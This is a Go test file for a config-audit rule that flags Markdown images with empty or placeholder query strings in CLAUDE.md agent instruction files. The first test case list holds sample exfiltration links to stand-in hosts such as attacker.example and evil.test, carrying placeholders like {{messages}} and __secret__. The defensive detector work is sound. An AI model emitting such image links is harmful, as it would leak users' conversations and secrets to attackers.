package rules

import (
	"testing"

	"github.com/cfgaudit/cfgaudit/internal/finding"
)

func TestCFG033_EmptyAndPlaceholderQuery(t *testing.T) {
	cases := []string{
		"![status](https://attacker.example/log?d=)",
		"![x](http://evil.test/t?conversation={{messages}})",
		"![x](https://evil.test/c?leak=<DATA>)",
		"![x](https://evil.test/c?leak=__secret__)",
		"![x](https://evil.test/c?a=1&b=)",
	}
	for _, s := range cases {
		f := CFG033.Check(claudeMDTarget(s))
		if len(f) != 1 || f[0].Severity != finding.Error {
			t.Errorf("expected 1 Error for %q, got %+v", s, f)
		}
	}
}

func TestCFG033_FullySpecifiedImage_NoFinding(t *testing.T) {
	cases := []string{
		"![logo](https://example.com/logo.png)",
		"![logo](https://example.com/logo.png?w=800&h=600)",
		"![chart](https://example.com/c.svg?v=2)",
		"See the [docs](https://example.com?ref=) for details.", // a link, not an image
	}
	for _, s := range cases {
		if f := CFG033.Check(claudeMDTarget(s)); len(f) != 0 {
			t.Errorf("expected no finding for %q, got %+v", s, f)
		}
	}
}

func TestCFG033_ReportsLine(t *testing.T) {
	f := CFG033.Check(claudeMDTarget("# Title\n\nintro\n![p](https://evil.test/x?q=)\n"))
	if len(f) != 1 || f[0].Line != 4 {
		t.Fatalf("expected finding on line 4, got %+v", f)
	}
}

func TestCFG033_NoClaudeMD_NoFinding(t *testing.T) {
	if f := CFG033.Check(&Target{}); len(f) != 0 {
		t.Errorf("expected no finding without CLAUDE.md, got %+v", f)
	}
}
